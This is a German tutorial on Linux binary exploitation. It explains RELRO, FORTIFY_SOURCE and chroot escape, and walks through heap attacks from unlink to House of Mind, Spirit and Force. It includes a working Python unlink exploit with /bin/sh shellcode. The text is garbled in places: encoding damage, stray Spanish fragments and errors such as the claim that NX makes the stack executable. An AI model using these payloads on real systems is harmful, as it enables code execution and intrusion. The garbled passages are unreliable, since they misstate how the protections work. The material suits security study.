**Relro (Read only Relocation)** beeinflusst die Speicherberechtigungen √§hnlich wie NX. Der Unterschied besteht darin, dass w√§hrend NX den Stack ausf√ºhrbar macht, RELRO bestimmte Dinge schreibgesch√ºtzt macht, sodass wir nicht darauf schreiben k√∂nnen. Der h√§ufigste Weg, wie ich gesehen habe, dass dies ein Hindernis darstellt, besteht darin, uns daran zu hindern, eine **`got`-Tabelle zu √ºberschreiben**, was sp√§ter behandelt wird. Die `got`-Tabelle enth√§lt Adressen f√ºr libc-Funktionen, damit das Bin√§rprogramm wei√ü, welche Adressen es sind und sie aufrufen kann. Schauen wir uns an, wie die Speicherberechtigungen f√ºr einen `got`-Tabelleneintrag f√ºr ein Bin√§rprogramm mit und ohne Relro aussehen.

Mit Relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Ohne Relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
F√ºr die Bin√§rdatei **ohne relro** k√∂nnen wir sehen, dass die `got`-Eintragsadresse f√ºr `fgets` `0x404018` ist. Wenn wir uns die Speicherzuordnungen ansehen, sehen wir, dass sie zwischen `0x404000` und `0x405000` liegt, was die **Berechtigungen `rw`** hat, was bedeutet, dass wir darauf lesen und schreiben k√∂nnen. F√ºr die Bin√§rdatei **mit relro** sehen wir, dass die Adresse der `got`-Tabelle f√ºr die Ausf√ºhrung der Bin√§rdatei (pie ist aktiviert, daher wird sich diese Adresse √§ndern) `0x555555557fd0` ist. In der Speicherzuordnung dieser Bin√§rdatei liegt sie zwischen `0x0000555555557000` und `0x0000555555558000`, was die Speicherberechtigung `r` bedeutet, was bedeutet, dass wir nur daraus lesen k√∂nnen.

Also, was ist die **Umgehung**? Die typische Umgehung, die ich verwende, ist einfach nicht in Speicherbereiche zu schreiben, die durch relro schreibgesch√ºtzt werden, und **einen anderen Weg finden, um Codeausf√ºhrung zu erreichen**.

Beachten Sie, dass die Bin√§rdatei vor der Ausf√ºhrung die Adressen der Funktionen kennen muss:

* Lazy Binding: Die Adresse einer Funktion wird beim ersten Aufruf der Funktion gesucht. Daher muss die GOT w√§hrend der Ausf√ºhrung Schreibberechtigungen haben.
* Bind now: Die Adressen der Funktionen werden zu Beginn der Ausf√ºhrung gel√∂st, dann werden schreibgesch√ºtzte Berechtigungen f√ºr sensible Abschnitte wie .got, .dtors, .ctors, .dynamic, .jcr vergeben. `` `** ``-z relro`**`y`**`-z now\`\*\*

Um zu √ºberpr√ºfen, ob ein Programm Bind now verwendet, k√∂nnen Sie Folgendes tun:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Cuando der Bin√§rdatei im Speicher geladen wird und eine Funktion zum ersten Mal aufgerufen wird, wird zur PLT (Procedure Linkage Table) gesprungen, von dort aus wird zu der GOT gesprungen und festgestellt, dass dieser Eintrag nicht aufgel√∂st wurde (enth√§lt eine Adresse nach der PLT). Daher ruft es den Laufzeit-Linker oder rtfd auf, um die Adresse aufzul√∂sen und in der GOT zu speichern.

Wenn eine Funktion aufgerufen wird, wird die PLT aufgerufen, die die Adresse der GOT enth√§lt, in der die Adresse der Funktion gespeichert ist, und leitet den Fluss dorthin um, um die Funktion aufzurufen. Wenn jedoch die Funktion zum ersten Mal aufgerufen wird, enth√§lt die GOT die n√§chste Anweisung der PLT, daher folgt der Fluss dem PLT-Code (rtfd) und ermittelt die Adresse der Funktion, speichert sie in der GOT und ruft sie auf.

Beim Laden einer Bin√§rdatei in den Speicher hat der Compiler angegeben, an welcher Offset Daten platziert werden m√ºssen, die geladen werden sollen, wenn das Programm ausgef√ºhrt wird.

Lazy binding -> Die Adresse der Funktion wird gesucht, wenn die Funktion zum ersten Mal aufgerufen wird, daher hat die GOT Schreibberechtigungen, damit sie dort gespeichert wird und nicht erneut gesucht werden muss.

Bind now -> Die Adressen der Funktionen werden beim Laden des Programms gesucht und die Berechtigungen der Abschnitte .got, .dtors, .ctors, .dynamic, .jcr werden auf nur Lesen ge√§ndert. **-z relro** und **-z now**

Trotzdem sind Programme im Allgemeinen nicht mit diesen Optionen kompliziert, daher bleiben diese Angriffe weiterhin m√∂glich.

**readelf -l /proc/ID_PROC/exe | grep BIND_NOW** -> Um festzustellen, ob BIND NOW verwendet wird

**Fortify Source -D_FORTIFY_SOURCE=1 or =2**

Versucht, unsichere Funktionen zu identifizieren, die Daten unsicher von einem Ort zum anderen kopieren, und ersetzt die Funktion durch eine sichere Funktion.

Zum Beispiel:\
char buf\[16];\
strcpy(but, source);

Es wird als unsicher identifiziert und dann wird strcpy() durch \_\_strcpy\_chk() ersetzt, wobei die Puffergr√∂√üe als maximale zu kopierende Gr√∂√üe verwendet wird.

Der Unterschied zwischen **=1** oder **=2** ist, dass:

Die zweite Option verhindert, dass **%n** aus einem Abschnitt mit Schreibberechtigung stammt. Au√üerdem kann der Parameter f√ºr den direkten Zugriff auf Argumente nur verwendet werden, wenn die vorherigen verwendet wurden, d.h. **%3$d** kann nur verwendet werden, wenn zuvor **%2$d** und **%1$d** verwendet wurden.

Um die Fehlermeldung anzuzeigen, wird argv\[0] verwendet, daher wird, wenn dort die Adresse eines anderen Ortes (wie einer globalen Variablen) angegeben wird, der Inhalt dieser Variablen in der Fehlermeldung angezeigt. Seite 191

**Ersatz von Libsafe**

Es wird aktiviert durch: LD_PRELOAD=/lib/libsafe.so.2\
oder\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Es werden unsichere Funktionsaufrufe durch sichere ersetzt. Es ist nicht standardisiert. (nur f√ºr x86, nicht f√ºr Kompilierungen mit -fomit-frame-pointer, nicht f√ºr statische Kompilierungen, nicht alle anf√§lligen Funktionen werden sicher gemacht und LD_PRELOAD funktioniert nicht bei SUID-Bin√§rdateien).

**ASCII Armored Address Space**

Es beinhaltet das Laden von gemeinsam genutzten Bibliotheken von 0x00000000 bis 0x00ffffff, um sicherzustellen, dass immer ein Byte 0x00 vorhanden ist. Dies h√§lt jedoch kaum einen Angriff auf, insbesondere nicht in Little Endian.

**ret2plt**

Es beinhaltet die Durchf√ºhrung eines ROP, bei dem die Funktion strcpy@plt (aus der plt) aufgerufen wird und auf den Eintrag der GOT gezeigt wird, und das erste Byte der Funktion, die aufgerufen werden soll (system()), kopiert wird. Anschlie√üend wird dasselbe mit GOT+1 gemacht und das 2. Byte von system() kopiert... Schlie√ülich wird die in der GOT gespeicherte Adresse aufgerufen, die system() sein wird.

**Falsches EBP**

F√ºr Funktionen, die EBP als Register verwenden, um auf Argumente zu zeigen, wenn der EIP ge√§ndert wird und auf system() gezeigt wird, muss auch EBP ge√§ndert werden, um auf einen Speicherbereich zu zeigen, der 2 beliebige Bytes und dann die Adresse zu &‚Äù/bin/sh‚Äù enth√§lt.

**Jails mit chroot()**

debootstrap -arch=i386 hardy /home/user -> Installiert ein grundlegendes System unter einem bestimmten Unterverzeichnis

Ein Administrator kann aus einer solchen Jail ausbrechen, indem er: mkdir foo; chroot foo; cd .. macht.

**Code-Instrumentierung**

Valgrind -> Sucht nach Fehlern\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap-√úberl√§ufe: Grundlegende Exploits**

**Zugewiesenes St√ºck**

prev_size |\
size | ‚ÄîHeader\
\*mem | Daten

**Freies St√ºck**

prev_size |\
size |\
\*fd | Ptr vorw√§rts Chunk\
\*bk | Ptr r√ºckw√§rts Chunk ‚ÄîHeader\
\*mem | Daten

Die freien St√ºcke sind in einer doppelt verketteten Liste (bin) und es d√ºrfen niemals zwei freie St√ºcke nebeneinander sein (sie werden zusammengef√ºhrt).

Im "size"-Feld gibt es Bits, um anzuzeigen: ob das vorherige St√ºck in Benutzung ist, ob das St√ºck √ºber mmap() zugewiesen wurde und ob das St√ºck zum prim√§ren Arena geh√∂rt.

Wenn ein St√ºck freigegeben wird und eines der benachbarten St√ºcke frei ist, werden sie durch die Makro unlink() fusioniert und das gr√∂√üere neue St√ºck wird frontlink() √ºbergeben, um es in den entsprechenden Bin einzuf√ºgen.

unlink(){\
BK = P->bk; ‚Äî> Das BK des neuen Chunks ist das, was das zuvor freie St√ºck hatte\
FD = P->fd; ‚Äî> Das FD des neuen Chunks ist das, was das zuvor freie St√ºck hatte\
FD->bk = BK; ‚Äî> Das BK des folgenden Chunks zeigt auf den neuen Chunk\
BK->fd = FD; ‚Äî> Das FD des vorherigen Chunks zeigt auf den neuen Chunk\
}

Daher, wenn es uns gelingt, P->bk mit der Adresse eines Shellcodes und P->fd mit der Adresse eines Eintrags in der GOT oder DTORS minus 12 zu √§ndern, wird erreicht:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Und so wird der Shellcode ausgef√ºhrt, wenn das Programm beendet wird.

Au√üerdem schreibt die 4. Anweisung von unlink() etwas und der Shellcode muss daf√ºr angepasst werden:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Dies f√ºhrt dazu, dass 4 Bytes ab dem 8. Byte des Shellcodes geschrieben werden, daher muss die erste Anweisung des Shellcodes ein Sprung sein, um dies zu √ºberspringen und zu den Nops zu gelangen, die den Rest des Shellcodes ausf√ºhren.

Daher wird der Exploit erstellt:

Im Puffer1 wird der Shellcode platziert, beginnend mit einem Sprung, damit er zu den Nops oder dem Rest des Shellcodes gelangt.

Nach dem Shellcode wird F√ºllmaterial eingef√ºgt, bis zum prev_size- und size-Feld des n√§chsten St√ºcks. An diesen Stellen werden 0xfffffff0 (um das prev_size zu √ºberschreiben, damit das Bit angezeigt wird, dass es frei ist) und "-4" (0xfffffffc) in die size eingef√ºgt (damit, wenn im 3. St√ºck √ºberpr√ºft wird, ob das 2. frei war, tats√§chlich auf das modifizierte prev_size zugegriffen wird, das angibt, dass es frei ist) -> Wenn also free() √ºberpr√ºft, wird es zur size des 3. St√ºcks gehen, aber tats√§chlich zum 2. - 4 und denken, dass das 2. St√ºck frei ist. Dann wird unlink() aufgerufen.

Beim Aufruf von unlink() werden die ersten Daten des 2. St√ºcks als P->fd verwendet, daher wird dort die Adresse eingef√ºgt, die √ºberschrieben werden soll - 12 (da FD->bk 12 zur in FD gespeicherten Adresse hinzuf√ºgt). An dieser Adresse wird die zweite Adresse im 2. St√ºck eingef√ºgt, die die Adresse des Shellcodes sein soll (falsches P->bk).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Es ist wichtig, dass das Bit, das angibt, dass der vorherige Chunk frei ist, auf 1 gesetzt ist**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, damit der "size" des 3. Chunks 4 Bytes hinter dem vorherigen liegt (zeigt auf prev\_size), da dort √ºberpr√ºft wird, ob der 2. Chunk frei ist**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Im Payload f√ºgen wir am Anfang 8 Bytes Padding hinzu**

**got\_free = pack("\<I", 0x08048300 - 12) #Adresse von free() in der plt-12 (wird √ºberschrieben, um die Shellcode beim zweiten Aufruf von free() auszuf√ºhren)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Wie erw√§hnt, beginnt das Payload mit 8 Bytes Padding aus einem bestimmten Grund**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Der 2. Chunk wird modifiziert, got\_free zeigt auf die Stelle, an der die Adresse addr\_sc + 12 gespeichert wird**

**os.system("./8.3.o " + payload)**

**unset() in umgekehrter Reihenfolge freigeben (Wargame)**

Wir kontrollieren 3 aufeinanderfolgende Chunks und geben sie in umgekehrter Reihenfolge frei.

In diesem Fall:

Der Shellcode wird in Chunk c platziert.

Chunk a wird verwendet, um b zu √ºberschreiben, so dass das Size-Bit PREV\_INUSE deaktiviert wird und Chunk a als frei betrachtet wird.

Dar√ºber hinaus wird die Gr√∂√üe im Header von b √ºberschrieben, um -4 zu sein.

Daher wird das Programm denken, dass "a" frei ist und in einem Bin liegt, und unlink() aufrufen, um es zu entkoppeln. Da jedoch der Header PREV\_SIZE -4 betr√§gt, wird angenommen, dass der "a"-Chunk tats√§chlich bei b+4 beginnt. Mit anderen Worten, es wird unlink() auf einen Chunk ausgef√ºhrt, der bei b+4 beginnt, sodass sich der Pointer "fd" bei b+12 und der Pointer "bk" bei b+16 befinden.

Auf diese Weise, wenn wir die Adresse des Shellcodes in bk und die Adresse der Funktion "puts()" -12 in fd setzen, haben wir unser Payload.

**Frontlink-Technik**

Frontlink wird aufgerufen, wenn etwas freigegeben wird und keiner seiner benachbarten Chunks frei ist. unlink() wird nicht aufgerufen, sondern frontlink() wird direkt aufgerufen.

N√ºtzliche Schwachstelle, wenn das angegriffene malloc nie freigegeben wird (free()).

Ben√∂tigt:

Einen Puffer, der mit der Eingabefunktion √ºberlaufen kann

Einen benachbarten Puffer, der freigegeben werden muss und dessen fd-Feld im Header durch den √úberlauf des vorherigen Puffers ge√§ndert wird

Einen Puffer, der gr√∂√üer als 512, aber kleiner als der vorherige Puffer ist, der freigegeben werden soll

Einen Puffer, der vor Schritt 3 deklariert wird und es erm√∂glicht, den prev\_size dieses Puffers zu √ºberschreiben

Durch das √úberlaufen von zwei mallocs auf unkontrollierte Weise und eines auf kontrollierte Weise, der nur freigegeben wird, kann ein Exploit durchgef√ºhrt werden.

**Vulnerabilit√§t double free()**

Wenn free() zweimal mit demselben Zeiger aufgerufen wird, zeigen zwei Bins auf dieselbe Adresse.

Wenn einer erneut verwendet werden soll, wird er problemlos zugewiesen. Wenn der andere verwendet werden soll, wird ihm derselbe Speicherplatz zugewiesen, sodass die Pointer "fd" und "bk" mit den Daten gef√§lscht werden, die die vorherige Reservierung schreibt.

**After free()**

Ein zuvor freigegebener Zeiger wird erneut ohne Kontrolle verwendet.

## **8 Heap-√úberl√§ufe: Fortgeschrittene Exploits**

Die Techniken Unlink() und FrontLink() wurden entfernt, als die Funktion unlink() ge√§ndert wurde.

**The house of mind**

Nur ein Aufruf von free() ist erforderlich, um die Ausf√ºhrung beliebigen Codes zu verursachen. Es ist wichtig, einen zweiten Chunk zu finden, der von einem vorherigen √ºberlaufen und freigegeben werden kann.

Ein Aufruf von free() f√ºhrt dazu, dass public\_fREe(mem) aufgerufen wird, das Folgendes ausf√ºhrt:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Gibt einen Zeiger auf die Adresse zur√ºck, an der der Chunk beginnt (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

In \[1] wird das Feld size und das Bit NON\_MAIN\_ARENA √ºberpr√ºft, das ge√§ndert werden kann, damit die √úberpr√ºfung true zur√ºckgibt und heap\_for\_ptr() ausgef√ºhrt wird, das ein "and" auf "mem" ausf√ºhrt und die 2,5 unwichtigsten Bytes auf 0 setzt (in unserem Fall von 0x0804a000 auf 0x08000000) und auf 0x08000000->ar\_ptr zugreift (als ob es ein struct heap\_info w√§re).

Auf diese Weise, wenn wir beispielsweise einen Chunk bei 0x0804a000 kontrollieren und ein Chunk bei **0x081002a0** freigegeben wird, k√∂nnen wir die Adresse 0x08100000 erreichen und beliebige Daten schreiben, z.B. **0x0804a000**. Wenn dieser zweite Chunk freigegeben wird, wird heap\_for\_ptr(ptr)->ar\_ptr den Wert zur√ºckgeben, den wir in 0x08100000 geschrieben haben (da auf 0x081002a0 das zuvor erw√§hnte "and" angewendet wird und von dort der Wert der ersten 4 Bytes, ar\_ptr, abgeleitet wird).

Dann wird \_int\_free(ar\_ptr, mem) aufgerufen, d.h. **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Wie zuvor erw√§hnt, k√∂nnen wir den Wert von av kontrollieren, da wir ihn im freigegebenen Chunk schreiben.

Wie unsorted\_chunks definiert ist, wissen wir, dass:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Daher, wenn wir den Wert von \_\_DTOR\_END\_\_-12 in av->bins\[2] schreiben, wird in der letzten Anweisung in \_\_DTOR\_END\_\_ die Adresse des zweiten Chunks geschrieben.

Mit anderen Worten, am Anfang des ersten Chunks m√ºssen wir die Adresse von \_\_DTOR\_END\_\_-12 viele Male platzieren, da av->bins\[2\] diesen Wert verwendet.

An der Adresse, an der die Adresse des zweiten Chunks mit den letzten 5 Nullen landet, muss die Adresse dieses ersten Chunks geschrieben werden, damit heap\_for\_ptr() denkt, dass ar\_ptr am Anfang des ersten Chunks liegt und av->bins\[2\] von dort abruft.

Im zweiten Chunk und dank des ersten √ºberschreiben wir prev\_size mit einem Sprung von 0x0c und size mit etwas, um -> NON\_MAIN\_ARENA zu aktivieren.

Dann f√ºgen wir im zweiten Chunk viele Nops und schlie√ülich den Shellcode hinzu.

Auf diese Weise wird \_int\_free(CHUNK1, CHUNK2) aufgerufen und den Anweisungen gefolgt, um die Adresse des prev\_size von CHUNK2 in \_\_DTOR\_END\_\_ zu schreiben, der dann zum Shellcode springt.

F√ºr die Anwendung dieser Technik sind einige weitere Anforderungen erforderlich, die das Payload etwas komplizierter machen.
Esta t√©cnica ya no es aplicable, da fast der gleiche Patch wie bei unlink angewendet wurde. Es wird √ºberpr√ºft, ob die neue Adresse, auf die gezeigt wird, auch auf sich selbst zeigt.

**Fastbin**

Es ist eine Variante von The House of Mind.

Es ist wichtig, den folgenden Code auszuf√ºhren, der nach der ersten √úberpr√ºfung der Funktion \_int\_free() erreicht wird:

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> wobei fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

Auf diese Weise, wenn "fb" auf die Adresse einer Funktion in der GOT gesetzt wird, wird an dieser Adresse die Adresse des √ºberschriebenen Chunks platziert. Daf√ºr muss die Arena in der N√§he der Adressen von dtors sein. Genauer gesagt muss av->max\_fast an der Adresse stehen, die wir √ºberschreiben werden.

Da wir mit The House of Mind gesehen haben, dass wir die Position von av kontrollieren konnten.

Deshalb, wenn wir in das Feld size eine Gr√∂√üe von 8 + NON\_MAIN\_ARENA + PREV\_INUSE setzen, wird fastbin\_index() fastbins\[-1] zur√ºckgeben, das auf av->max\_fast zeigen wird.

In diesem Fall wird av->max\_fast die Adresse sein, die √ºberschrieben wird (nicht die, auf die gezeigt wird, sondern diese Position wird √ºberschrieben).

Au√üerdem muss der benachbarte Chunk des freigegebenen Chunks gr√∂√üer als 8 sein -> Da wir gesagt haben, dass die Gr√∂√üe des freigegebenen Chunks 8 betr√§gt, m√ºssen wir in diesen falschen Chunk nur eine Gr√∂√üe gr√∂√üer als 8 setzen (da die Shellcode im freigegebenen Chunk sein wird, muss am Anfang ein jmp stehen, der in Nops f√§llt).

Au√üerdem muss dieser falsche Chunk kleiner als av->system\_mem sein. av->system\_mem ist 1848 Bytes weiter.

Aufgrund der Nullen von \_DTOR\_END\_ und der wenigen Adressen in der GOT sind keine dieser Adressen f√ºr das √úberschreiben geeignet. Sehen wir also, wie wir Fastbin anwenden k√∂nnen, um den Stack anzugreifen.

Eine andere Angriffsmethode besteht darin, den **av** auf den Stack umzuleiten.

Wenn wir die Gr√∂√üe so √§ndern, dass sie 16 anstelle von 8 betr√§gt, dann wird fastbin\_index() fastbins\[0\] zur√ºckgeben und wir k√∂nnen dies nutzen, um den Stack zu √ºberschreiben.

Daf√ºr d√ºrfen im Stack keine Canarys oder seltsamen Werte vorhanden sein, tats√§chlich m√ºssen wir uns hier befinden: 4 Nullbytes + EBP + RET

Die 4 Nullbytes sind erforderlich, damit der **av** auf diese Adresse zeigt und das erste Element eines **av** ist das Mutex, das den Wert 0 haben muss.

Der **av->max\_fast** wird das EBP sein und ein Wert, der uns helfen wird, die Einschr√§nkungen zu umgehen.

Im **av->fastbins\[0\]** wird die Adresse von **p** √ºberschrieben und wird das RET sein, so dass der Shellcode ausgef√ºhrt wird.

Au√üerdem wird in **av->system\_mem** (1484 Bytes √ºber der Position im Stack) gen√ºgend M√ºll vorhanden sein, der es uns erm√∂glicht, die √úberpr√ºfung zu umgehen.

Au√üerdem muss der benachbarte Chunk des freigegebenen Chunks gr√∂√üer als 8 sein -> Da wir gesagt haben, dass die Gr√∂√üe des freigegebenen Chunks 16 betr√§gt, m√ºssen wir in diesen falschen Chunk nur eine Gr√∂√üe gr√∂√üer als 8 setzen (da die Shellcode im freigegebenen Chunk sein wird, muss am Anfang ein jmp stehen, der in Nops f√§llt, die nach dem Feld size des neuen falschen Chunks stehen).

**The House of Spirit**

In diesem Fall versuchen wir, einen Zeiger auf ein malloc zu haben, der vom Angreifer ver√§nderbar ist (zum Beispiel, dass der Zeiger im Stack unter einem m√∂glichen √úberlauf zu einer Variablen liegt).

So k√∂nnten wir diesen Zeiger auf eine beliebige Stelle zeigen lassen. Allerdings ist nicht jeder Ort g√ºltig, die Gr√∂√üe des gef√§lschten Chunks muss kleiner als av->max\_fast und genauer gesagt gleich der angeforderten Gr√∂√üe bei einem zuk√ºnftigen Aufruf von malloc()+8 sein. Daher, wenn wir wissen, dass nach diesem verwundbaren Zeiger ein malloc(40) aufgerufen wird, muss die Gr√∂√üe des gef√§lschten Chunks 48 betragen.

Wenn das Programm zum Beispiel den Benutzer nach einer Zahl fragt, k√∂nnten wir 48 eingeben und den ver√§nderbaren malloc-Zeiger auf die n√§chsten 4 Bytes zeigen lassen (die zum EBP geh√∂ren k√∂nnten, so dass die 48 dahinter bleibt, als ob es die Kopfgr√∂√üe w√§re). Au√üerdem muss die Adresse ptr-4+48 mehreren Bedingungen entsprechen (in diesem Fall ist ptr=EBP), das hei√üt, 8 < ptr-4+48 < av->system\_mem.

Wenn dies zutrifft, wird beim n√§chsten malloc-Aufruf, den wir als malloc(40) angegeben haben, die Adresse auf den EBP gesetzt. Wenn der Angreifer auch kontrollieren kann, was in diesem malloc geschrieben wird, kann er sowohl den EBP als auch den EIP mit der gew√ºnschten Adresse √ºberschreiben.

Ich denke, das liegt daran, dass, wenn es freigegeben wird, free() speichert, dass an der Adresse, auf die der EBP im Stack zeigt, ein Chunk mit der perfekten Gr√∂√üe f√ºr das neue malloc() reserviert ist, und weist ihm diese Adresse zu.

**The House of Force**

Es wird ben√∂tigt:

* Ein √úberlauf zu einem Chunk, der es erm√∂glicht, das Wilderness zu √ºberschreiben
* Ein Aufruf von malloc() mit der vom Benutzer definierten Gr√∂√üe
* Ein Aufruf von malloc(), dessen Daten vom Benutzer definiert werden k√∂nnen

Zuerst wird die Gr√∂√üe des Wilderness-Chunks mit einem sehr gro√üen Wert (0xffffffff) √ºberschrieben, so dass jede ausreichend gro√üe Speicheranforderung in \_int\_malloc() behandelt wird, ohne den Heap erweitern zu m√ºssen.

Zweitens wird av->top ge√§ndert, damit es auf einen vom Angreifer kontrollierten Speicherbereich zeigt, wie den Stack. In av->top wird \&EIP - 8 platziert.

Wir m√ºssen av->top √ºberschreiben, damit es auf den vom Angreifer kontrollierten Speicherbereich zeigt:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim erh√§lt den Wert der Adresse des aktuellen Wilderness-Chunks (des aktuellen av->top) und remainder ist genau die Summe dieser Adresse plus der Anzahl der Bytes, die von malloc() angefordert wurden. Wenn also \&EIP-8 bei 0xbffff224 liegt und av->top 0x080c2788 enth√§lt, dann ist die Menge, die im kontrollierten malloc reserviert werden muss, damit av->top auf $EIP-8 f√ºr das n√§chste malloc() zeigt:

0xbffff224 - 0x080c2788 = 3086207644.

So wird der ge√§nderte Wert in av->top gespeichert und das n√§chste malloc zeigt auf den EIP und kann √ºberschrieben werden.

